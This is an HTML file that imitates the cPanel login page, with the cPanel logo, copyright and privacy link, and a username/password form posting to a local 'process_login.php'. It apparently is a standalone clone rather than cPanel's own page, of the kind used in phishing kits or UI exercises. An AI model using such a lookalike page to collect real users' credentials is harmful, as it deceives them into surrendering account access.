<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>cPanel Login</title>
        <link rel="stylesheet" href="../public/scss/style.css">
        <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
    </head>
    <body>
        <section>
            <nav class="logo">
                <img src="../public/images/cpanel-logo.svg" width="100%" alt="cPanel">
            </nav>
            <form action="process_login.php" method="POST">
                <label for="username">
                    <span class="label">Username</span>
                    <input type="text" class="username" name="username" placeholder="Enter your username." required>
                </label>
                <label for="password">
                    <span class="label">Password</span>
                    <input type="password" class="password" name="password" placeholder="Enter your account password." required>
                </label>
                <button type="submit" name="submit">
                    Log in
                </button>
            </form>
        </section>
        <footer>
            <ul class="languages">
                <li>English</li>
                <li>العربية </li>
                <li>čeština </li>
                <li>dansk </li>
                <li>Deutsch </li>
                <li>Ελληνικά </li>
                <li>español </li>
                <li>español latinoamericano </li>
                <li>…</li>
            </ul>
            <nav>
                <ul>
                    <li class="bckg"></li>
                    <li class="cpy">
                        Copyright© 2023 cPanel, L.L.C.
                    </li>
                    <li>
                        <a href="https://go.cpanel.net/privacy" class="target">
                            Privacy Policy
                        </a>
                    </li>
                </ul>
            </nav>
        </footer>
    </body>
</html>
